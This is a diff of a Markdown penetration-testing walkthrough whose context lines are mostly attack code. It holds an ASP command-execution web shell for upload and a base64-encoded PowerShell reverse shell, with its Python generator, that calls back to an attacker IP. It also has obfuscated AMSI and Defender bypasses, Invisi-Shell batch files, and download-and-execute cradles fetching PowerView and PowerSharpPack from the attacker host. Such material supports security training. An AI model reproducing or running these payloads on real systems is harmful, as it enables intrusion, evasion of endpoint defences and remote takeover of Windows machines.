@@ -10,7 +10,7 @@ Let’s create a basic `.asp` payload for command execution and upload it.
 
 > *At the time of writing, this avoid defender signature*
 
-```python
+```
 <%
 Function getResult(theParam)
     Dim objSh, objResult
@@ -47,7 +47,7 @@ We can continue from here using the webpage interface or we can get a reverse sh
 
 Let’s use the following payload to generate a reverse shell and encode it to base64 so we can also bypass Windows Defender detection  as well.
 
-```python
+```
 #!/usr/bin/env python
 import base64
 import sys
@@ -78,7 +78,7 @@ Creating the reverse shell and encoding it to base64.
 
 `./Shell_ConvB64.py 10.4.10.1 53`
 
-```python
+```
 powershell -exec bypass -enc CgAkAGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAOQAyAC4AMQA2ADgALgA1ADYALgAxACcALAA1ADMAKQA7AAoAJABzACAAPQAgACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AAoAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAC4AUgBlAGEAZAAoACQAYgAsACAAMAAsACAAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAKACAAIAAgACAAJABkACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAIAAkAGkAKQA7AAoAIAAgACAAIAAkAHMAYgAgAD0AIAAoAGkAZQB4ACAAJABkACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7AAoAIAAgACAAIAAkAHMAYgAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBiACAAKwAgACcAcABzAD4AIAAnACkAOwAKACAAIAAgACAAJABzAC4AVwByAGkAdABlACgAJABzAGIALAAwACwAJABzAGIALgBMAGUAbgBnAHQAaAApADsACgAgACAAIAAgACQAcwAuAEYAbAB1AHMAaAAoACkACgB9ADsACgAkAGMALgBDAGwAbwBzAGUAKAApAAoA
 ```
 
@@ -136,7 +136,7 @@ If CMD non Admin right:
 
 **RunWithRegistryNonAdmin.bat**
 
-```shell
+```
 set COR_ENABLE_PROFILING=1
 set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
 
@@ -154,7 +154,7 @@ REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" 
 If CMD Admin right
 **RunWithPathAsAdmin.bat**
 
-```shell
+```
 set COR_ENABLE_PROFILING=1
 set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
 set COR_PROFILER_PATH=%~dp0InvisiShellProfiler.dll
@@ -168,17 +168,17 @@ set COR_PROFILER_PATH=
 
 Then in PowerShell
 
-```shell
+```
 S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
 ```
 
-`(New-Object Net.WebClient).DownloadFile('``[http://10.4.10.1:8080/PowerView.ps1','C:\\tmp\\PowerView.ps1](http://192.168.56.1:8080/PowerView.ps1%27,%27C:%5C%5Ctmp%5C%5CPowerView.ps1)``')`
+`(New-Object Net.WebClient).DownloadFile('http://10.4.10.1:8080/PowerView.ps1','C:\tmp\PowerView.ps1')`
 
 Invisi-Shell 
 
 AMSI Bypass (if you are in Powershell revershe shell using Evil-WinRM remote access to the target)
 
-```shell
+```
 $x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
 ```
 
@@ -187,7 +187,7 @@ post from @ShitSecure explaining the difference between powershell and .net AMSI
 
 Now lets use Rasta-Mouse  AMSI-Bypass, add it to a .txt file and upload it to the target and execute it.
 
-```shell
+```
 # Patching amsi.dll AmsiScanBuffer by rasta-mouse
 $Win32 = @"
 
@@ -236,7 +236,7 @@ Let’s use WinPEAS script to enumerate the machine and try to escalate our priv
 
 If you don’t want to be bored to compile .net app or modify them with public class and method and no exit.environment you can also use [PowerSharpPack](https://github.com/S3cur3Th1sSh1t/PowerSharpPack) and get everything done for you (thanks again to @ShitSecure).
 
-```shell
+```
 iex(new-object net.webclient).downloadstring('http://10.4.10.1:8080/PowerSharpPack.ps1')
 PowerSharpPack -winPEAS
 ```
